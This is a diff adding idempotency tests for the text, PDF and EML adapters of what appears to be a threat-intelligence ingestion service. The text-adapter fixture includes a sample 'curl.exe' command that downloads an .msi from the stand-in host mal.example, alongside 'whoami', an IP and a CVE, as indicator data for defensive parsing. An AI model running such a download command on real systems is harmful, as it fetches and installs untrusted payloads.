@@ -206,3 +206,63 @@ def test_relationship_enum_covers_all_documented_verbs():
     enum_values = {r.value for r in RelationshipType}
     missing = documented - enum_values
     assert not missing, f"enum missing documented verbs: {missing}"
+
+
+# ─── R10 · Idempotent Adapters ─────────────────────────────────────────
+def _strip_nondeterministic(iep_dict):
+    """Remove fields that are permitted to differ between runs (id,
+    timestamps, execution time, processing time)."""
+    import copy
+    d = copy.deepcopy(iep_dict)
+    d.pop("id", None)
+    prov = dict(d.get("provenance") or {})
+    prov.pop("captured_at", None)
+    d["provenance"] = prov
+    meta = dict(d.get("metadata") or {})
+    adapter = dict((meta.get("data") or {}).get("adapter") or {})
+    adapter.pop("execution_time_ms", None)
+    if adapter:
+        meta_data = dict(meta.get("data") or {})
+        meta_data["adapter"] = adapter
+        meta["data"] = meta_data
+        d["metadata"] = meta
+    stats = dict(d.get("statistics") or {})
+    stats.pop("processing_time_ms", None)
+    d["statistics"] = stats
+    # Artifact / relationship IDs are UUIDs — allowed to differ per run.
+    for a in d.get("artifacts") or []:
+        a.pop("id", None)
+    return d
+
+
+def test_r10_text_adapter_is_idempotent():
+    from services.adapters import TextAdapter
+    body = ("whoami\n"
+            "curl.exe -o C:\\a.msi https://mal.example/a.msi\n"
+            "10.0.0.42\n"
+            "CVE-2024-57727\n")
+    a = TextAdapter()
+    iep_a = a.make_iep(body).model_dump()
+    iep_b = a.make_iep(body).model_dump()
+    assert _strip_nondeterministic(iep_a) == _strip_nondeterministic(iep_b), \
+        "Text adapter is not idempotent"
+
+
+def test_r10_pdf_adapter_is_idempotent():
+    from tests.test_adapter_pdf import PDF_BYTES
+    from services.adapters import PDFAdapter
+    a = PDFAdapter()
+    iep_a = a.make_iep(PDF_BYTES).model_dump()
+    iep_b = a.make_iep(PDF_BYTES).model_dump()
+    assert _strip_nondeterministic(iep_a) == _strip_nondeterministic(iep_b), \
+        "PDF adapter is not idempotent"
+
+
+def test_r10_eml_adapter_is_idempotent():
+    from tests.test_adapter_eml import EML_BYTES
+    from services.adapters import EMLAdapter
+    a = EMLAdapter()
+    iep_a = a.make_iep(EML_BYTES).model_dump()
+    iep_b = a.make_iep(EML_BYTES).model_dump()
+    assert _strip_nondeterministic(iep_a) == _strip_nondeterministic(iep_b), \
+        "EML adapter is not idempotent"
